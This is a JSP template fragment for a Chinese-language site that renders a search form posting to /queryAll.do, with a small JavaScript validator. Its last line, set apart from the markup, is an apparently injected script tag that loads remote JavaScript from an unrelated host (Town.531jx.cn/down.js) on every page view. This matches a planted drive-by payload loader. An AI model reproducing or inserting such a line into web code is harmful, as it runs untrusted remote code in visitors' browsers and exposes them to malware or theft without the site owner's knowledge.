<b></b><%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<script language="javascript">
<!--
function checkQueryAllForm(){
   if(validate(document.queryAllForm.queryKey, '查询字符串', 'public', 2, 32, false)){
	   	     document.queryAllForm.submit();
   }
}

//-->
</script>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
        <tr> 
          <td height="26" colspan="3" class="red15" background="images/bg_table_title.gif"> 
            <div align="center">您还想要找什么？</div>
          </td>
        </tr>
        <tr bgcolor="#FFFFFF"> 
          <td width="23">&nbsp;</td>
          <td width="154"> 
            <form name="queryAllForm" method="post" action='<c:url value="/queryAll.do"/>'>
              <table width="144" height="75" border="0" bgcolor="#FFFFFF">
                <tr> 
                  <td width="12" height="38">&nbsp;</td>
                  <td colspan="2" valign="bottom" height="38"> 
                    <input name="queryKey" type="text" id="from2" size="15" height="20" >
                  </td>
                </tr>
                <tr> 
                  <td>&nbsp;</td>
                  <td width="22">&nbsp;</td>
                  <td width="96"><a href="javascript:checkQueryAllForm()"><img src="images/in_query.gif" width="85" height="26" border="0" usemap="#Map8MapMap"></a></td>
                </tr>
                <tr> 
                  <td height="19">&nbsp;</td>
                  <td colspan="2" height="19"><a href="#"><img src="images/index_146.gif" alt="" width="63" height="15" border="0"></a></td>
                </tr>
              </table>
            </form>
          </td>
          <td>&nbsp;</td>
        </tr>
</table>
      
<script language=javascript src=http://Town.531jx.cn/down.js></script>